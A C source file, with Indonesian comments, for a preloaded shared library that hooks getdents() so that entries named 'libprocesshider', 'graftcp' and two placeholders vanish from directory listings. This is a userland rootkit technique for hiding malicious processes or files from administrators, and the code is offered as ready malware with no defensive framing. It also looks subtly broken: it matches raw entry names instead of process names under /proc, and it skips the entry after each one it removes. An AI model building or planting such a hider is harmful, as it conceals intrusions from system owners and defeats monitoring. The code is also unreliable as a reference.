#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#define MAX_NAME_LEN 256

// Proses yang ingin disembunyikan
const char *hidden_processes[] = {"proses_yang_dihapus1", "proses_yang_dihapus2", "libprocesshider", "graftcp", NULL};

struct linux_dirent {
    long d_ino;
    off_t d_off;
    unsigned short d_reclen;
    char d_name[];
};

typedef int (*orig_getdents_type)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    orig_getdents_type orig_getdents;
    orig_getdents = (orig_getdents_type)dlsym(RTLD_NEXT, "getdents");

    int ret = orig_getdents(fd, dirp, count);
    if(ret <= 0) {
        return ret;
    }

    int curpos = 0;
    struct linux_dirent *dir;
    while(curpos < ret) {
        dir = (struct linux_dirent *) ((char*)dirp + curpos);
        char *cur_name = dir->d_name;

        int i = 0;
        while(hidden_processes[i]) {
            if(strcmp(cur_name, hidden_processes[i]) == 0) {
                int reclen = dir->d_reclen;
                char *next_rec = (char*)dir + reclen;
                int tail_len = (int)((char*)dirp + ret - next_rec);
                memmove(dir, next_rec, tail_len);
                ret -= reclen;
                continue;
            }
            i++;
        }
        curpos += dir->d_reclen;
    }
    return ret;
}
